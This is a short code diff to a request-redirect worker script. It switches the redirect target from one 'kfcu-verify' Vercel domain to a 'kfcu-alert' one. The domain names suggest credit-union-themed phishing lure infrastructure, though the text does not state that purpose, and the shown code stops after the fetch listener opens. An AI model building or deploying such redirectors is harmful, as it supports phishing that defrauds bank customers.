@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://kfcu-verify.vercel.app"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://kfcu-alert.vercel.app"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
